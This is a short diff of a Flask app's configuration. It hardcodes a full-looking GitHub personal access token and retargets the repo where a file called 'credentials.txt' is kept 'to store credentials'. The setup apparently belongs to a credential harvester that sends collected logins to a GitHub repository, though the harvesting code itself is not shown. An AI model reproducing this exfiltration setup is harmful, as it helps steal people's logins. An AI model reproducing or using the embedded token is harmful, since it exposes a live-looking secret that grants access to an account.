@@ -6,7 +6,7 @@ app = Flask(__name__)
 
 # GitHub configuration (replace with your details)
 GITHUB_TOKEN = "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"  # Your GitHub Personal Access Token
-REPO_NAME = "Kul-juX/seed"  # Your GitHub repo (e.g., username/repo)
+REPO_NAME = "vum80-kiPlz/trials"  # Your GitHub repo (e.g., username/repo)
 FILE_PATH = "credentials.txt"  # File in repo to store credentials
 
 @app.route('/')
